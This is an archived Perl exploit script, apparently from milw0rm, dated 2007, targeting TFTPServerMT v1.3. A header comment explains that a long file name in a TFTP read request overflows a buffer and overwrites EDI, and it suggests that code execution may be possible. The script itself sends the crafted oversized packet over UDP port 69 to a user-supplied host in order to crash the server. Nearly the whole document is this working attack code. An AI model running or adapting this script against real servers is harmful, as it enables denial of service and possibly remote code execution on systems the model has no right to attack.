#################################################################################################################
#    Name : TFTPServerMT v 1.3 Remote Buffer Overflow Dos Exploit
#  
#   Author: Umesh Wanve
#
#     Date: 01-03-2007
#
#   Desc: This is latest version of TFTP server. EDI gets overwritten at 246. So code execution may be possible
#         Someone can better write it. Sending a long file name on the vulnerable server can crash the server.
#
#   Details: http://sourceforge.net/project/showfiles.php?group_id=162512
#
###############################################################################################################
#!/usr/bin/perl

use IO::Socket;
#use strict;

 
my($read_request)="\x00\x01";                                                # GET or PUT request

my($tailer)="\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00";                      #transporting mode (eg. netascii)   

my($pad)="\x90" x 279;                                



if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],

PeerPort => "69",

Proto    => "UDP"))
{
                

                 print $socket "\x00\x01".("A"x242)."BBBB".$tailer;

                 sleep(1);
            
               
                 close($socket);
}
else
{
                 print "Cannot connect to $ARGV[0]:23\n";
}
# __END_CODE 

# milw0rm.com [2007-03-12]
